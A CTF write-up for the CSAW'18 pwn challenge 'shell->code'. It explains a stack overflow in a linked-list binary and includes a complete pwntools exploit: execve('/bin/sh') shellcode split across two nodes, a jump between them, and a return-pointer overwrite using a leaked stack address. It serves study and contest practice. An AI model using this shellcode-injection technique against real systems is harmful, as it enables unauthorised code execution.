---
layout: post
title: "CSAW’18 CTF Qualification Round: shell->code"
author: yrlf
categories: writeup
tags: [cat/pwn, tool/radare2, tool/pwntools]
---

* **Category:** pwn
* **Points:** 100
* **Description:**

> Linked lists are great! They let you chain pieces of data together.
> 
> ```sh
> nc pwn.chal.csaw.io 9005
> ```
>
> [shellpointcode](https://ctf.csaw.io/files/32cc91e380dac838a4f2978dfd963fb3/shellpointcode)

## Writeup

For this challenge, we got an x86\_64 linux binary (not stripped, NX is
disabled) that asks us for 15 bytes of input for each of two nodes of a linked
list.

The linked list struct looks like this:

```c
struct linked_list {
    struct linked_list * next;
    char data[15];
};
```

Both node instances lie on the stack, and the "next" pointer of the first points
to the second.

Afterwards, it prints out the first node, revealing the stack address of the
second node.

Then, the "goodbye" function asks for our initials and reads data in a far too
small stack buffer (buffer overflow).

## The Attack

We can redirect program execution to the heap buffer in the second node by
overwriting the return pointer in the "goodbye" function.

We cannot directly insert off-the-shelf shellcode into the buffers because they
are too small, so we chopped pwntools' `shellcraft.sh()` shellcode in half and
added a relative jump to redirect into the other node.

This gets us a shell allowing us to see the flag:

```
flag{NONONODE_YOU_WRECKED_BRO}
```

## The Script

This is the cleaned up script used to extract the flag:

```py
from pwn import *

context.arch = "amd64"

r = remote("pwn.chal.csaw.io", 9005)

node2 = asm("""
    /* push b'/bin///sh\x00' */
    push 0x68
    mov rax, 0x732f2f2f6e69622f
    push rax
""") + b"\xeb\x11"

node1 = asm("""
    /* call execve('rsp', 0, 0) */
    push (SYS_execve) /* 0x3b */
    pop rax
    mov rdi, rsp
    xor esi, esi /* 0 */
    cdq /* rdx=0 */
    syscall
""")

r.readuntil(b"1: ")
print(">> node1")
r.sendline(node1)
r.readuntil(b"2: ")
print(">> node2")
r.sendline(node2)
r.readline()

r.readline()
r.readuntil(b": ")
addr = int(r.readline()[:-1], 16)
r.readline()
print(">> addr", hex(addr))

r.readline()
r.readline()
print(">> rop")
r.sendline(b"A"*11 + p64(addr+8))
r.readline()

r.sendline(b"cat flag.txt")
print(r.readline().decode())
```
